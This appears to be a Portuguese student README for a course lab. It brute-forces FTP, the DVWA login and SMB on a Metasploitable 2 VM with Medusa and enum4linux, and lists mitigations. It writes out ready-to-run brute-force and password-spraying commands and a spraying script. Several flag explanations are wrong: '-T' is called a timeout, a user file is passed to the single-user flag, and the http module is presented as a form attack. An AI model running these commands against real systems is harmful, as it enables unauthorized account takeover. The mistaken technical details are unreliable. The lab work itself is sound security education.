

````
# Projeto de Auditoria de Segurança com Kali Linux & Medusa

## Introdução
Este repositório documenta minha jornada no desafio de segurança da DIO, com foco em ataques de **força bruta** usando a ferramenta **Medusa** em um ambiente controlado. O objetivo é demonstrar conceitos de brute force contra serviços como **FTP**, **formulários web (DVWA)** e **SMB**, usando máquinas virtuais isoladas. Todos os testes foram realizados em VMs locais (Kali como atacante e Metasploitable 2 como alvo) — **sem impacto em sistemas reais**.

> **Aviso ético:** Este projeto é estritamente educacional. Testes de intrusão fora de ambientes autorizados são ilegais e antiéticos. Execute apenas em labs controlados e com permissão expressa. Sempre siga práticas responsáveis de cibersegurança (senhas fortes, MFA, autorização, etc.).

---

## Sumário
- [Configuração do Ambiente](#configuração-do-ambiente)  
- [Ataques Simulados](#ataques-simulados)  
  - Força Bruta em FTP  
  - Força Bruta em Formulário Web (DVWA)  
  - Password Spraying em SMB  
- [Análise & Mitigações](#análise--mitigações)  
- [Arquivos do Repositório](#arquivos-do-repositório)  
- [Conclusão](#conclusão)

---

## Configuração do Ambiente

### Ferramentas utilizadas
- **VirtualBox** — criação de VMs.  
- **Kali Linux** — VM atacante (ex.: 2023.4).  
- **Metasploitable 2** — VM alvo com serviços vulneráveis (FTP, SMB, DVWA).  
- **Medusa** — ferramenta de brute force (pré-instalada no Kali).  
- **enum4linux** — enumeração SMB.  
- **DVWA** — Web app vulnerável para testes (nível `low` durante os testes).

### Rede e IPs
Rede configurada como **Host-Only Adapter** no VirtualBox para isolar o tráfego:
- Kali: `192.168.56.101`  
- Metasploitable: `192.168.56.102`

### Requisitos básicos
- VMs com recursos mínimos (Kali: 2GB RAM, 20GB disco; Metasploitable: 1GB RAM, 10GB disco).  
- Conectividade: do Kali execute `ping 192.168.56.102` para verificar.  
- DVWA: acessível em `http://192.168.56.102/dvwa` (configurado em nível `Low`).

---

## Ataques Simulados

> **Observação:** as wordlists usadas são simples e apenas demonstrativas. Em ambientes reais, políticas de segurança e contramedidas torneiam ataques muito menos efetivos.

### Wordlists usadas
Arquivos em `/wordlists`:
- `users.txt` — nomes de usuários comuns (ex.: `msfadmin`, `root`, `admin`).  
- `passwords.txt` — senhas fracas (ex.: `password`, `123456`, `admin`).

---

### 1) Força Bruta em FTP (porta 21)
O FTP do Metasploitable mantém credenciais padrão (`msfadmin:msfadmin`).

**Comando Medusa:**
```bash
medusa -h 192.168.56.102 -u users.txt -P passwords.txt -M ftp -T 10 -t 4 -f -F
````

* `-h`: host alvo
* `-u` e `-P`: arquivos de usuários e senhas
* `-M ftp`: módulo FTP
* `-T 10`: timeout 10s
* `-t 4`: threads paralelas
* `-f -F`: parar ao encontrar credenciais válidas

**Resultado:** `msfadmin:msfadmin` (validação via `ftp 192.168.56.102`).


---

### 2) Força Bruta em Formulário Web (DVWA - login)

DVWA em nível `Low` permite automação do login (sem rate limiting/CAPTCHA).

**Comando Medusa (HTTP form):**

```bash
medusa -h 192.168.56.102 -u admin -P passwords.txt -M http -m DIR:/dvwa/login.php -T 1 -t 4
```

* `-m DIR:/dvwa/login.php`: caminho do formulário (Medusa injeta os campos `username` e `password`).

**Resultado:** `admin:password` — acesso ao dashboard do DVWA.


---

### 3) Password Spraying em SMB (porta 445)

Primeiro realizei enumeração de usuários:

```bash
enum4linux -U 192.168.56.102 > users_enum.txt
```

Em seguida, password spraying com Medusa (testa uma senha contra múltiplos usuários para evitar lockouts):

```bash
medusa -h 192.168.56.102 -U users_enum.txt -p password -M smbnt -t 4
```

**Resultado:** sucesso com `msfadmin:password` (validação com `smbclient`).


---

## Análise & Reflexões

### Vulnerabilidades observadas

* **Credenciais fracas/padrão** facilitam brute force.
* **Falta de proteções web** (rate limiting, CAPTCHA) permite automação simples.
* **Enumeração SMB** expõe usuários que possibilitam spraying.
* Em ambientes legacy, ataques simples continuam efetivos.

### Recomendações de mitigação

* **Senhas fortes & gerenciadores** (mín. 12 caracteres; alta entropia).
* **Autenticação multifator (MFA)** sempre que possível.
* **Rate limiting / bloqueio de tentativas / CAPTCHA** para formulários web.
* **Monitoramento e alertas** (OSSEC, Wazuh, Splunk) para detectar tentativas.
* **Desabilitar serviços obsoletos** (ex.: FTP) ou migrar para FTPS/SFTP.
* **Políticas de lockout e detecção de spraying** (limitar tentativas por usuário/por IP).
* **Defesa em profundidade**: firewalls, IDS/IPS (ex.: Snort), atualização contínua.

**Exemplo simples de limitação com iptables:**

```bash
iptables -A INPUT -p tcp --dport 21 -m limit --limit 3/min -j ACCEPT
```

---

## Arquivos no repositório

* `/wordlists/users.txt` — wordlist de usuários.
* `/wordlists/passwords.txt` — wordlist de senhas.
* `/scripts/enum_smb.sh` — script para enumeração e spraying (exemplo).
* `/images/` — capturas de tela (FTP, DVWA, SMB).
* `README.md` — este arquivo.

**Exemplo do script `enum_smb.sh`:**

```bash
#!/bin/bash
# Uso: ./enum_smb.sh 192.168.56.102
enum4linux -U $1 > users_enum.txt
medusa -h $1 -U users_enum.txt -p password -M smbnt -t 4
```


## Autor

Adriel Castor
* Data: 27/09/2025
